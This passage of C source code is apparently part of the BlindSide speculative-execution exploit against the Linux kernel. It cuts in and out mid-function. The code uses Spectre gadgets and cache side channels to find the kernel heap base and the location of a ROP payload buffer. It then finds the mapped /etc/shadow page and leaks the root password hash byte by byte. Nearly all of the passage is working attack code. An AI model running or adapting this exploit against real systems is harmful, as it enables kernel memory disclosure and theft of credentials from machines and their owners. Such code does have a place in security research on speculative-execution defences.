          }
          if (found && num_tests < NUM_VERIFICATIONS) {
            // make sure we do enough tests
            printf("\n!! WARNING: not enough tests performed: %d\n", num_tests);
          }

          if (found) {
            // check if it was noise
            write_spectre_data(specex_socket_second, spectre_gadget_address, 0x0, 0x0);
            int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD_SPECTRE), evicset_idx, cl_idx);
            if (got_signal) {
              found = 0;
              printf("\n[.]  >> false signal in page 0x%lx (stage 3)\n", try_addr);
              try_addr -= steps;
              goto retry_heap_search;
            }
          }

          if (found) {
            printf("\n[.]  >> found data page @ 0x%lx - #probed_addresses=%d\n", try_addr, num_probed_addr);
            break;
          } else {
            // write back stage a pointer
            write_spectre_data(specex_socket_second, spectre_gadget_address, 0x0, try_addr + cl_idx * 0x40 + 0x28);
          }
        }
      }
      if (found) {
        break;
      }
    }

    if (found) {
      if (steps == ONE_GB) {
        break;
      } else {
        printf("[.]  >> step back, lower step size and continue scanning\n");
        try_addr -= 2*steps;
        steps = ONE_GB;
        found = 0;
        print_progress = 1;
      }
    }

retry_heap_search:
    try_addr += steps;
  }
  if (!found) {
    printf("\n");
  }

  clock_gettime(CLOCK_MONOTONIC, &finish);
  elapsed = (finish.tv_sec - start.tv_sec);
  elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished scanning in %.3f sec\n", elapsed);

  if (!found) {
    printf("[-]  >> failed to find base of heap memory. exiting..\n");
    exit(1);
  }

  heap_base = try_addr & ~(ONE_GB-1);
#endif
  printf("[.]  >> heap base address = 0x%lx\n", heap_base);
  printf("[.] searching for heap base address.. DONE\n");
  return heap_base;
}

// Object Probing
int non_evicted_cacheset_indices[1+NUM_VERIFICATIONS]; //= {-1, -1, -1, -1, -1, -1};
int num_non_evicted_cacheset_indices = 0;
int find_non_evicted_cachesets_for_heap_obj_searching(int evicset_idx) {
  int num_execs = 40;

  // iteration variables
  int i;

  write_data_pointers(specex_socket_second, 0x0, 0x0);

  for (i = 0; i < 1 + NUM_VERIFICATIONS; i++) {
    non_evicted_cacheset_indices[i] = -1;
  }
  num_non_evicted_cacheset_indices = 0;
  int cl_rand = rand() % 64;
  for (i = 0; i < NUM_CACHELINES_PAGE; i++) {
    int cl_idx = ((i+cl_rand)*167 + 13) & 0x3f;

    int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * 0.05), evicset_idx, cl_idx);
    if (!got_signal) {
      non_evicted_cacheset_indices[num_non_evicted_cacheset_indices] = cl_idx;
      num_non_evicted_cacheset_indices += 1;
    }

    if (num_non_evicted_cacheset_indices == sizeof(non_evicted_cacheset_indices) / sizeof(int)) {
      break;
    }
  }

  if (num_non_evicted_cacheset_indices < 1+NUM_VERIFICATIONS) {
    printf("[-] Could not find sufficient non evicted cachesets..\n");
    return 1;
  }

  return 0;
}

int test_candidate_evicset_idx_for_data_page_2deref(unsigned long data_page_addr, int evicset_idx, int cacheline_idx) {
  int num_execs = 36;

  write_data_pointers(specex_socket_second, data_page_addr + cacheline_idx*0x40 - 0x138, 0x0);

  return specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD), evicset_idx, cacheline_idx);
}

int find_data_page_evicset_idx_2deref(unsigned long data_page_addr, unsigned long kernel_base_address) {
  int i;
  int num_candidates = NUM_EVICSETS;
  int candidates[NUM_EVICSETS];

  unsigned long gadget_addr = kernel_base_address + OFFSET_HEAP_OBJ_LEAKING_GADGET;
  write_fptr(specex_socket_second, gadget_addr, 8);

  for (i = 0; i < NUM_EVICSETS; i++) {
    candidates[i] = 1; // set all indices as candidates
  }

  int tested_cachelines = 0;
  int cl_rand = rand() % 64;
  while (num_candidates > 1 && tested_cachelines < NUM_CACHELINES_PAGE) {
    int cacheline_idx = ((tested_cachelines+cl_rand) * 167 + 13) & 0x3f;

    for (i = 0; i < NUM_EVICSETS; i++) {
      if (candidates[i] != 1) {
        continue;
      }

      int good_candidate = test_candidate_evicset_idx_for_data_page_2deref(data_page_addr, i, cacheline_idx);
      if (!good_candidate) {
        num_candidates -= 1;
        candidates[i] = 0;
      }
    }

    tested_cachelines += 1;
  }

  if (num_candidates != 1) {
    printf("[-] Went through all stages to find data page evicset idx but failed..\n");
    exit(1);
  }

  // assert found evicset idx is right
  int evicset_idx = -1;
  for (i = 0; i < NUM_EVICSETS; i++) {
    if (candidates[i] == 1) {
      evicset_idx = i;
      break;
    }
  }

  if (evicset_idx == -1) {
    printf("[-] Could not find data page evicset idx. exiting..\n");
    exit(1);
  }

  return evicset_idx;
}

#define OOB_WRITE_SEARCH_THRESHOLD 0.486
unsigned long find_oob_write_location_3deref(unsigned long kernel_base_address, unsigned long heap_base) {
  unsigned long oob_write_location = 0x0;
  printf("\n[.] searching for vulnerable buffer location i.e. where ROP payload will reside..\n");
#if SKIP_FINDING_OOB_WRITE_LOCATION
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");
  oob_write_location = (unsigned long) get_sock_addr(specex_socket_first);
#else
  int num_execs = 43;

  // iteration variables
  int i;
  int cl_idx, tmp_cl_idx;

  unsigned long signal_page = heap_base;
  int signal_page_evicset_idx = find_data_page_evicset_idx_2deref(signal_page, kernel_base_address);
  printf("[.]  >> found eviction set of page where signal will land using 2 deref gadget\n");

  // overwrite function address with gadget address
  unsigned long gadget_addr = kernel_base_address + OFFSET_HEAP_OBJ_LEAKING_GADGET;
  write_fptr(specex_socket_second, gadget_addr, 8);
  printf("[.]  >> using 3 deref gadget @ 0x%lx for scanning\n", gadget_addr);

  // *** then, search heap object / ROP payload location ***
  if (find_non_evicted_cachesets_for_heap_obj_searching(signal_page_evicset_idx)) {
    printf("Failed to find non-evicted cachesets for heap obj search. Consider recreating evicsets? Exiting..\n");
    exit(1);
  }

  printf("[.]  >> found non-evicted cachesets to test during search (checking cachesets in 1 eviction set)\n");

  fflush(stdout);
  int found = 0;
  unsigned long steps = 0x8000;
  unsigned long try_addr = heap_base;

  printf("[.]  >> scanning in range: 0x%lx - 0x%lx\n", try_addr, try_addr + (16*ONE_GB));
  printf("[.]  >> step size = 0x%lx\n", steps);

  struct timespec start, finish;
  double elapsed = 0;
  clock_gettime(CLOCK_MONOTONIC, &start);

  int num_probed_addr = 0;
  while (!found && try_addr < heap_base + 17*ONE_GB) {
    if ( (try_addr - heap_base) % 0x4000000 == 0 ) {
      clock_gettime(CLOCK_MONOTONIC, &finish);
      elapsed = (finish.tv_sec - start.tv_sec);
      elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;

      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_addresses=%d - elapsed_time=%.3f sec",
              try_addr, 100.0  * (try_addr - heap_base) / (17*ONE_GB), num_probed_addr, elapsed);
      fflush(stdout);
    }
    num_probed_addr += 1;

    cl_idx = non_evicted_cacheset_indices[0];
    write_data_pointers(specex_socket_second, try_addr + 0x800 + 0x160 - 0x138, signal_page + cl_idx*0x40 - 0x80);

    int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * OOB_WRITE_SEARCH_THRESHOLD), signal_page_evicset_idx, cl_idx);
    if (got_signal) {
      // do stage 2b
      found = 1;
      int num_tests = 0;
      for (i = 1; i < num_non_evicted_cacheset_indices; ++i) {
        tmp_cl_idx = non_evicted_cacheset_indices[i];
        write_data_pointers(specex_socket_second, try_addr + 0x800 + 0x160 - 0x138, signal_page + tmp_cl_idx*0x40 - 0x80);

        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * OOB_WRITE_SEARCH_THRESHOLD), signal_page_evicset_idx, tmp_cl_idx);
        if (!got_signal) {
          found = 0;
          break;
        }

        num_tests += 1;
      }
      if (found && num_tests < NUM_VERIFICATIONS) {
        // make sure we do enough tests
        printf("\n!! WARNING: not enough tests performed: %d\n", num_tests);
      }

      if (found) {
        // check if it was noise
        write_data_pointers(specex_socket_second, 0x0, 0x0);
        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * OOB_WRITE_SEARCH_THRESHOLD), signal_page_evicset_idx, cl_idx);
        if (got_signal) {
          found = 0;
          printf("\n[.]  >> false signal in page 0x%lx (stage 3)\n", try_addr);
          try_addr -= steps;
          goto retry_write_location_search;
        }
      }

      if (found) {
        printf("\n[.]  >> found data-controlled page @ 0x%lx - #probed_addresses=%d\n", try_addr, num_probed_addr);
        break; // break out of while loop
      } else {
      }
    }

retry_write_location_search:
    try_addr += steps;
  }
  if (!found) {
    printf("\n");
  }

  clock_gettime(CLOCK_MONOTONIC, &finish);
  elapsed = (finish.tv_sec - start.tv_sec);
  elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished scanning in %.3f sec\n", elapsed);

  if (!found) {
    printf("[-]  >> failed to find ROP payload location. exiting..\n");
    exit(1);
  }

  oob_write_location = try_addr;
#endif
  printf("[.]  >> vulnerable buffer @ 0x%lx\n", oob_write_location);
  printf("[.] searching for vulnerable buffer location i.e. where ROP payload will reside.. DONE\n");
  return oob_write_location;
}

// Spectre Probing
#define THRESHOLD 0.450
#define NUM_REPETITIONS 44
unsigned long find_user_page_in_physmap(unsigned long user_page, unsigned long user_page_size, unsigned long heap_base,
        unsigned long gadget_addr, unsigned long kernel_base) {
  unsigned long physmap_addr = 0x0;
  printf("\n[.] searching for user page in kernel heap/physmap to enable Flush+Reload through physmap..\n");
#if SKIP_FINDING_USER_PAGE
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");
  physmap_addr = heap_base + (unsigned long) get_phys_addr((void*)user_page);
#else
  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;

  memset((char*)user_page, 0x0, 16);

  *(int*) (user_page+0) = rand();
  unsigned long signature = (unsigned long) *(unsigned int*) (user_page+0);
  printf("[.]  >> initialized user page with random signature: 0x%08lx\n", signature);

  unsigned long spectre_array_addr = kernel_base;
  int spectre_array_evicset_idx = find_code_page_evicset_idx(spectre_array_addr);
  printf("[.]  >> found eviction set of code page where signal will land (using no gadget)\n");

#define FIND_USER_PAGE_TEST_CACHELINES (1 + NUM_VERIFICATIONS)
  // find non-evicted cachelines
  //printf("find %d non-evicted cachelines\n", FIND_USER_PAGE_TEST_CACHELINES);
  int test_cachelines[FIND_USER_PAGE_TEST_CACHELINES];

  write_spectre_data(specex_socket_second, gadget_addr, 0x0, 0x0);
  printf("[.]  >> using spectre gadget @ 0x%lx for scanning\n", gadget_addr);

  int i, c, found_test_cachelines = 0;
  int cl_rand = rand() % 64;
  for (i = 0; i < FIND_USER_PAGE_TEST_CACHELINES; i++) {
    test_cachelines[i] = -1;
  }
  for (i = 0; i < 64; i++) {
    c = ((i+cl_rand) * 167 + 13) & 0x3f;

    int got_signal = specex_check_signal_pp(NUM_REPETITIONS, (int) (NUM_REPETITIONS * 0.05), spectre_array_evicset_idx, c);
    if (!got_signal) {
      test_cachelines[found_test_cachelines] = c;
      found_test_cachelines += 1;
      if (found_test_cachelines == FIND_USER_PAGE_TEST_CACHELINES) break;
    }
  }

  if (found_test_cachelines != FIND_USER_PAGE_TEST_CACHELINES) {
    printf("!! WARNING: did not find sufficient cachelines, %d\n", found_test_cachelines);
    exit(1);
  }

  printf("[.]  >> found non-evicted cachesets to test during search (checking cachesets in 1 eviction set)\n");

  unsigned long array_addr;
  unsigned long p;
  unsigned long num_pages = RAM_IN_GB * ONE_GB / user_page_size;

  int found = 0;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  int got_signal;

  printf("[.]  >> scanning for signature in range: 0x%lx - 0x%lx\n", heap_base, heap_base + RAM_IN_GB*ONE_GB);
  printf("[.]  >> step size = 0x%lx\n", user_page_size);

  for (p = 0; p < num_pages; p++) {
  //for (p = num_pages - 1; p > 0; p--) {
    unsigned long try_addr = heap_base + p * (user_page_size);

    if (p % 2000 == 0) {
      clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
      total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
      total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_addresses=%lu - elapsed_time=%.3f sec",
              try_addr, 100.0  * (try_addr - heap_base) / (RAM_IN_GB*ONE_GB), p, total_exec_elapsed);
      //printf("At page idx %lu / %lu (%.2f%%)\n", p, num_pages, p * 100.0 / num_pages);
    }

retry_find_user_page:
    found = 1;
    for (i = 0; i < FIND_USER_PAGE_TEST_CACHELINES; i++) {
      array_addr = spectre_array_addr + test_cachelines[i]*0x40;
      array_addr -= signature << 3;
      write_spectre_data(specex_socket_second, gadget_addr, array_addr, try_addr);

      got_signal = specex_check_signal_pp(NUM_REPETITIONS, (int) (NUM_REPETITIONS * THRESHOLD), spectre_array_evicset_idx, test_cachelines[i]);
      if (!got_signal) {
        found = 0;
        break;
      }
    }

    if (!found) {
      continue;
    }

    // check if it was noise
    write_spectre_data(specex_socket_second, gadget_addr, 0x0, try_addr);
    got_signal = specex_check_signal_pp(NUM_REPETITIONS, (int) (NUM_REPETITIONS * THRESHOLD), spectre_array_evicset_idx, test_cachelines[0]);
    if (got_signal) {
      found = 0;
      printf("[.] 1. find user page. >>> False signal in page 0x%lx\n", try_addr);
      goto retry_find_user_page;
    }

    clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
    total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
    total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;

    physmap_addr = heap_base + p * (user_page_size);

    printf("\n[.]  >> found signature @ 0x%lx - #probed_addresses=%lu\n", physmap_addr, p+1);
    printf("[.]  >> finished scanning in %.3f sec\n", total_exec_elapsed);

    break;
  }

  if (!found) {
    printf("\n[-]  >> Failed to find signature (0x%016lx), exec_time = %.3f sec\n", *(unsigned long*)user_page, total_exec_elapsed);
    exit(EXIT_FAILURE);
  }
#endif
  printf("[.]  >> user page's physmap address = 0x%lx\n", physmap_addr);
  printf("[.] searching for user page in kernel heap/physmap to enable Flush+Reload through physmap.. DONE\n");
  return physmap_addr;
}

unsigned long leak_byte_left_1byte(unsigned long spectre_gadget_addr, unsigned long user_page, unsigned long physmap_page, unsigned long target_addr, unsigned long val_at_target);
unsigned long leak_byte_right_1byte(unsigned long spectre_gadget_addr, unsigned long user_page, unsigned long physmap_page, unsigned long target_addr, unsigned long val_at_target);

unsigned long find_shadow_file(unsigned long spectre_gadget_addr, unsigned long heap_base,
      unsigned long user_page, unsigned long physmap_page) {
  unsigned long shadow_file_addr = 0x0;
  unsigned long curr_addr = heap_base;
  unsigned long end_addr = heap_base + RAM_IN_GB*ONE_GB;

  printf("\n[.] searching for mapped shadow file..\n");
#if SKIP_FINDING_SHADOW_FILE
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");

  // Note: due to gaps in the heap/physmap, get_bytes might crash the process
  char bytes[8];
  unsigned int sig1 = *(unsigned int*)&"root";
  unsigned int sig2 = *(unsigned int*)&"ot:$";
  curr_addr = end_addr-0x1000;
  while (curr_addr >= heap_base) {
    get_bytes((void*)curr_addr, bytes, 8);

    if (*(unsigned int*)bytes == sig1 && *(unsigned int*)(bytes+2) == sig2) {
      shadow_file_addr = curr_addr;
      break;
    }

    curr_addr -= 0x1000;
  }
#else
  unsigned long step_size = 0x1000;
  unsigned long test_value = *(unsigned int*) &"root";
  int hit_sequence = 0;

  printf("[.]  >> searching for page aligned signature \"root:$\" using Flush+Reload\n");
  printf("[.]  >> using spectre gadget @ 0x%lx for scanning\n", spectre_gadget_addr);
  printf("[.]  >> scanning in range: 0x%lx - 0x%lx\n", heap_base, end_addr);
  printf("[.]  >> step size = 0x%lx\n", step_size);

  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  while (curr_addr < end_addr) {
    // print progress
    if ( curr_addr % 0x10000000 == 0) {
      clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
      total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
      total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_locations=%d - elapsed_time=%.3f",
              curr_addr, 100.0 * (curr_addr - heap_base) / (end_addr - heap_base), (int) ((curr_addr - heap_base)/step_size),
              total_exec_elapsed);
      fflush(stdout);
    }

    // write gadget data
    int picked_cacheline_idx = rand() % 64;
    unsigned long kernel_signal_addr = physmap_page + picked_cacheline_idx*0x40;
    kernel_signal_addr -= test_value << 3;

    write_spectre_data(specex_socket_second, spectre_gadget_addr, kernel_signal_addr, curr_addr);

    // try same index 5 times

    int got_hit = specex_check_signal_fr(8, 1, user_page + picked_cacheline_idx*0x40);
    if (got_hit) {
      hit_sequence += 1;

      if (hit_sequence == 5) { // 10
        shadow_file_addr = curr_addr - (curr_addr % step_size); // realign to page
        break;
      }

      // try same page again with a different cacheline_idx.
      // reset curr_addr alignment and point it to next test value.
      curr_addr = curr_addr - (curr_addr % step_size);
      curr_addr += 2;
      test_value = *(unsigned int*)&"ot:$";
      continue;
    }

    // move to next page
    curr_addr += step_size - (curr_addr % step_size); // align to step_size
    hit_sequence = 0;
    test_value = *(unsigned int*)&"root";
  }
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
  total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;

  if (shadow_file_addr == 0xfffffffffffffffful) {
    printf("\n[.]  >> finished scanning in %.3f sec\n", total_exec_elapsed);
    printf("[-]  >> failed to find shadow file..\n");
    exit(EXIT_FAILURE);
  } else {
    printf("\n[.]  >> found signature @ 0x%lx - #probed_addresses=%d\n", shadow_file_addr, (int) ((curr_addr - heap_base)/step_size));
    printf("[.]  >> finished scanning in %.3f sec\n", total_exec_elapsed);
  }
#endif
  printf("[.]  >> shadow file address = 0x%lx\n", shadow_file_addr);
  printf("[.] searching for mapped shadow file.. DONE\n");
  return shadow_file_addr;
}

void leak_root_password_hash(unsigned long spectre_gadget_addr, unsigned long heap_base,
      unsigned long user_page, unsigned long physmap_page) {
  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;

  // find "root:$"
  unsigned long shadow_file_addr = find_shadow_file(spectre_gadget_addr, heap_base, user_page, physmap_page);

  // test if shadow_file_addr found
  if (shadow_file_addr == 0xfffffffffffffffful) {
    printf("[-] Failed to file page with shadow file\n");
    return;
  }

  // leak right
  char root_hash[256];
  memset(root_hash, 0, sizeof(root_hash));

  unsigned long curr_addr = shadow_file_addr;
  unsigned long curr_val = *(unsigned int*) &"root";

  *(unsigned int*) root_hash = curr_val;
  int curr_idx = 4;

  printf("\n[.] Leaking hash of root password..\n");
  char leaked_byte = '\0';
  int num_tries = 0;
  unsigned long last_failure_addr = 0;

  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  while (curr_idx < sizeof(root_hash)) {
    leaked_byte = leak_byte_right_1byte(spectre_gadget_addr, user_page, physmap_page, curr_addr, curr_val);
    if (leaked_byte == '\n') {
      break;
    }

    if (leaked_byte == 0xfffffffffffffffful) {
      num_tries += 1;
      use_int0x80 = (use_int0x80 + 1) % 2;

      if (last_failure_addr == 0 && num_tries == 30) {
        last_failure_addr = curr_addr;
        curr_addr -= 3;
        curr_idx -= 3;
        curr_val = *(unsigned int*) &root_hash[curr_addr - shadow_file_addr];
      }

      if (num_tries < 100) {
        continue;
      }

      printf("[-] Failed leak_byte_right_1byte at 0x%lx, #leaked-bytes: %d\n", curr_addr+4, curr_idx);
      break;
    }
    if (last_failure_addr > 0 && last_failure_addr == curr_addr) {
      last_failure_addr = 0;
      num_tries = 0;
    }

    root_hash[curr_idx] = leaked_byte & 0xff;
    curr_val = (curr_val >> 8) | ((leaked_byte & 0xff) << 24);

    curr_addr += 1;
    curr_idx += 1;
  }
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
  total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;

  if (leaked_byte == '\n') {
    printf("[+] Leaking hash of root password.. DONE in %.3f sec:\n%s\n", total_exec_elapsed, root_hash);
  } else {
    printf("[-] Failed to leak full root hash password..\n");
    exit(EXIT_FAILURE);
  }
}

#define TABLE_CODE_BYTE_TESTS 1

#if TABLE_CODE_BYTE_TESTS
#include "code_bytes_table.h"
#define TABLE_TEST_NUM_BYTES 32
#define TABLE_TEST_MIN_PERCENTAGE 50

#define TABLE_IGNORE_ORDER 0
#if TABLE_IGNORE_ORDER
#undef TABLE_TEST_NUM_BYTES
#define TABLE_TEST_NUM_BYTES 32
#undef TABLE_TEST_MIN_PERCENTAGE
#define TABLE_TEST_MIN_PERCENTAGE 0
#endif
int test_next_byte_based_on_table(int specex_socket, unsigned long spectre_gadget_addr,
      unsigned long user_page, unsigned long physmap_page,
      unsigned long target_addr, unsigned long resolved_bits, int lower_byte) {
  int i;
  int picked_cacheset = (rand() % 32) + 8;
  for (i = 0; i < TABLE_TEST_NUM_BYTES; i++) {
#if TABLE_IGNORE_ORDER
    unsigned long test_byte = i << 3;
#else
    unsigned long test_byte = code_byte_table[lower_byte][i].code_byte;
#endif

    unsigned long array_addr = physmap_page + picked_cacheset*0x40;
    array_addr -= (resolved_bits + test_byte) << 3;

    write_spectre_data(specex_socket, spectre_gadget_addr, array_addr, target_addr-1);

    int got_hit = specex_check_signal_fr(7, 2, user_page + picked_cacheset*0x40);
    if (got_hit) {
      return (int) (test_byte >> 3);
    }
  }

  return -1;
}
#endif

int get_most_hit_cacheset_idx(int specex_socket, unsigned long spectre_gadget_addr, unsigned long user_page, unsigned long physmap_page, unsigned long target_addr, unsigned long resolved_bits, int num_cachesets, int step_size, int* byte_idx_hits, int array_addr_adjuster, int num_execs, int total_runs) {
  int i,x;
  int num_runs = 0;

  // keeping start_cacheset_idx in lower half of the page. num_cachesets is max 32 and min 1
  int rand_offset = rand()%16;
  int highest_idx, second_highest_idx;
  while (num_runs < total_runs) {
    int start_cacheset_idx = ((((num_runs+rand_offset)%16) * 167 + 13) & 0xf) + 8;

    unsigned long array_addr = physmap_page + start_cacheset_idx*0x40 + array_addr_adjuster;
    array_addr -= resolved_bits << 3;

    write_spectre_data(specex_socket, spectre_gadget_addr, array_addr, target_addr-1);

    memset(byte_idx_hits, 0, sizeof(int)*32);
    for (x = 0; x < total_runs; x++) {
      for (i = start_cacheset_idx; i < step_size+start_cacheset_idx; i+=1) {
        int cl_idx = i;
        byte_idx_hits[cl_idx - start_cacheset_idx] += specex_check_signal_fr(1, 1, user_page + cl_idx*0x40);
      }

      highest_idx = second_highest_idx = -1;
      for (i = 0; i < step_size; i+=1) {
          if (highest_idx < 0 || byte_idx_hits[i] > byte_idx_hits[highest_idx]) {
            second_highest_idx = highest_idx;
            highest_idx = i;
          } else if (second_highest_idx < 0 || byte_idx_hits[i] > byte_idx_hits[second_highest_idx]) {
            second_highest_idx = i;
          }
      }
      // check highest, second highest
      if (byte_idx_hits[highest_idx] > byte_idx_hits[second_highest_idx] * 2 + 1) {
        break;
      }
    }

    num_runs += 1;

    if (byte_idx_hits[highest_idx] == byte_idx_hits[second_highest_idx]) {
      continue;
    }

    break;
  }

  return highest_idx;
}

// Byte leaking configuration
#define NUM_EXECS_0x000_5b  18
#define TOTAL_RUNS_0x000_5b 20 // 50 // 16
#define NUM_EXECS_0x000_1b   8
#define TOTAL_RUNS_0x000_1b 20 // 50 // 10

#define NUM_EXECS_0x800_5b  10
#define TOTAL_RUNS_0x800_5b 20 // 100 // 16
#define NUM_EXECS_0x800_1b   8
#define TOTAL_RUNS_0x800_1b 20 // 100 // 11

unsigned long leak_byte_left_1byte_obj_at_0x000(unsigned long spectre_gadget_addr, unsigned long user_page,
                          unsigned long physmap_page, unsigned long target_addr, unsigned long val_at_target) {
  int step_size_5b;

  step_size_5b = 32; // 8;

  unsigned long resolved_bits = (val_at_target & 0x00ffffff) << 8;

  int byte_hits[32]; // 32 fixed size; size hardcoded in get_most_hit_cacheset_idx
#if TABLE_CODE_BYTE_TESTS
  int high_5bits = -1;

  int lower_byte = val_at_target & 0xff;
  int count = 0;
  if (code_byte_table[lower_byte][TABLE_TEST_NUM_BYTES-1].percentage >= TABLE_TEST_MIN_PERCENTAGE) {
    while (high_5bits < 0) {
      high_5bits = test_next_byte_based_on_table(specex_socket_first, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, lower_byte);
      count++;
      if (count > 0 && count % 25 == 0) {
        fflush(stdout);
        return ~0ull;
      }
    }
  }
#else
  int high_5bits = get_most_hit_cacheset_idx(specex_socket_first, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 32, step_size_5b, byte_hits, 0x00, NUM_EXECS_0x000_5b, TOTAL_RUNS_0x000_5b);
#endif
  resolved_bits = resolved_bits | ((high_5bits & 0x1f) << 3);

  int third_bit = get_most_hit_cacheset_idx(specex_socket_first, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 2, 2, byte_hits, 0x20, NUM_EXECS_0x000_1b, TOTAL_RUNS_0x000_1b);
  resolved_bits = resolved_bits | ((third_bit & 0x1) << 2);

  int second_bit = get_most_hit_cacheset_idx(specex_socket_first, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 2, 2, byte_hits, 0x30, NUM_EXECS_0x000_1b, TOTAL_RUNS_0x000_1b);
  resolved_bits = resolved_bits | ((second_bit & 0x1) << 1);

  int first_bit = get_most_hit_cacheset_idx(specex_socket_first, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 2, 2, byte_hits, 0x38, NUM_EXECS_0x000_1b, TOTAL_RUNS_0x000_1b);
  resolved_bits = resolved_bits | ((first_bit & 0x1) << 0);

  return resolved_bits & 0xff;
}

unsigned long leak_byte_left_1byte_obj_at_0x800(unsigned long spectre_gadget_addr, unsigned long user_page,
                          unsigned long physmap_page, unsigned long target_addr, unsigned long val_at_target) {
  int step_size_5b;

  step_size_5b = 32;

  unsigned long resolved_bits = (val_at_target & 0x00ffffff) << 8;

  int byte_hits[32]; // 32 fixed size; size hardcoded in get_most_hit_cacheset_idx
#if TABLE_CODE_BYTE_TESTS
  int high_5bits = -1;

  int lower_byte = val_at_target & 0xff;
  int count = 0;
  if (code_byte_table[lower_byte][TABLE_TEST_NUM_BYTES-1].percentage >= TABLE_TEST_MIN_PERCENTAGE) {
    while (high_5bits < 0) {
      high_5bits = test_next_byte_based_on_table(specex_socket_second, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, lower_byte);
      count++;
      if (count > 0 && count % 25 == 0) {
        fflush(stdout);
        return ~0ull;
      }
    }
  }
#else
  int high_5bits = get_most_hit_cacheset_idx(specex_socket_second, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 32, step_size_5b, byte_hits, 0x00, NUM_EXECS_0x800_5b, TOTAL_RUNS_0x800_5b);
#endif
  resolved_bits = resolved_bits | ((high_5bits & 0x1f) << 3);

  int third_bit = get_most_hit_cacheset_idx(specex_socket_second, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 2, 2, byte_hits, 0x20, NUM_EXECS_0x800_1b, TOTAL_RUNS_0x800_1b);
  resolved_bits = resolved_bits | ((third_bit & 0x1) << 2);

  int second_bit = get_most_hit_cacheset_idx(specex_socket_second, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 2, 2, byte_hits, 0x30, NUM_EXECS_0x800_1b, TOTAL_RUNS_0x800_1b);
  resolved_bits = resolved_bits | ((second_bit & 0x1) << 1);

  int first_bit = get_most_hit_cacheset_idx(specex_socket_second, spectre_gadget_addr, user_page, physmap_page, target_addr, resolved_bits, 2, 2, byte_hits, 0x38, NUM_EXECS_0x800_1b, TOTAL_RUNS_0x800_1b);
  resolved_bits = resolved_bits | ((first_bit & 0x1) << 0);

  return resolved_bits & 0xff;
}

unsigned long leak_byte_left_1byte(unsigned long spectre_gadget_addr, unsigned long user_page, unsigned long physmap_page, unsigned long target_addr, unsigned long val_at_target) {
  if (target_addr % 0x1000 >= 0x7fe && target_addr % 0x1000 <= 0x924) {
    return leak_byte_left_1byte_obj_at_0x000(spectre_gadget_addr, user_page, physmap_page, target_addr, val_at_target);
  } else {
    return leak_byte_left_1byte_obj_at_0x800(spectre_gadget_addr, user_page, physmap_page, target_addr, val_at_target);
  }
}

unsigned long leak_byte_right_1byte(unsigned long spectre_gadget_addr, unsigned long user_page, unsigned long physmap_page, unsigned long target_addr, unsigned long val_at_target) {
  int use_specex_socket = -1;
  if (target_addr % 0x1000 >= 0x91c && target_addr % 0x1000 <= 0x922) {
    use_specex_socket = specex_socket_first;
  } else {
    use_specex_socket = specex_socket_second;
  }

  unsigned long test_byte;
  int picked_cacheset = (rand() % 32) + 16;
  unsigned long resolved_bits = val_at_target >> 8;
  for (test_byte = 0; test_byte < 256; test_byte++) {
    unsigned long array_addr = physmap_page + picked_cacheset*0x40;
    array_addr -= (resolved_bits | ((test_byte&0xff)<<24)) << 3;

    write_spectre_data(use_specex_socket, spectre_gadget_addr, array_addr, target_addr+1);

    int got_hit = specex_check_signal_fr(7, 2, user_page + picked_cacheset*0x40);
    if (got_hit) {
      return test_byte & 0xff;
    }
  }

  return 0xfffffffffffffffful;
}

#define SYNC_VALUE 0x00000000ul
unsigned long find_sync_point(unsigned long spectre_gadget_addr, unsigned long kernel_base_addr, unsigned long user_page,
          unsigned long physmap_page, unsigned long kernel_addr) {
